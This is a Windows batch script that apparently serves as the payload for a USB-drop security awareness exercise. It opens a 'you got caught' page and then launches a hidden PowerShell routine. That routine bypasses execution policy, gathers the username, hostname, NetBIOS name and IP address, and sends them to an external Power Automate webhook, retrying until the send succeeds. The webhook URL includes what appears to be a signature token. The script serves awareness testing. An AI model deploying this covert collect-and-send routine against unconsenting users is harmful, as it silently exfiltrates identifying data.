@echo off
:: USB_ID passed as argument from Arduino sketch, fallback if run manually
if "%~1"=="" (set USB_ID=MANUAL) else (set USB_ID=%~1)
set AWARENESS_URL=https://www.khipuawareness.co.uk/awareness/c8803bb920f32a6582260029c7404d983055d89355d291102c9fd2bea82e93e9/11/index.html

:: Launch awareness page immediately so user knows they got caught
start "" "%AWARENESS_URL%"

:: Silently collect and send data to Power Automate in background
start /b "" powershell -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference = 'SilentlyContinue';" ^
  "$u = (whoami).Split('\')[-1];" ^
  "$h = [System.Net.Dns]::GetHostName();" ^
  "$nb = (nbtstat -n 2>$null | Select-String '<00>\s+UNIQUE' | ForEach-Object { ($_ -split '\s+')[1] } | Select-Object -First 1);" ^
  "if (-not $nb) { $nb = $env:COMPUTERNAME };" ^
  "$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*' -and $_.IPAddress -notlike '169*'} | Select-Object -First 1).IPAddress;" ^
  "$t = [datetime]::UtcNow.ToString('o');" ^
  "$b = '[{\"timestamp\":\"' + $t + '\",\"username\":\"' + $u + '\",\"hostname\":\"' + $h + '\",\"netbios\":\"' + $nb + '\",\"ip\":\"' + $ip + '\",\"usb_id\":\"%USB_ID%\"}]';" ^
  "$uri = 'https://default186f8545468f49e59c70379e23e2af.14.environment.api.powerplatform.com:443/powerautomate/automations/direct/cu/07/workflows/077b9dbc48f54a7a93fecc9619390597/triggers/manual/paths/invoke?api-version=1&sp=%%2Ftriggers%%2Fmanual%%2Frun&sv=1.0&sig=DeE829DsviqXQivynKdiFqZOo2Hs05j5rYkZtUztfXA';" ^
  "do {" ^
  "  try {" ^
  "    $null = Invoke-WebRequest -Uri $uri -Method POST -Body $b -ContentType 'application/json' -UseBasicParsing -TimeoutSec 30;" ^
  "    $done = $true" ^
  "  } catch {" ^
  "    $done = $false;" ^
  "    Start-Sleep -Seconds 30" ^
  "  }" ^
  "} until ($done)"

exit /b
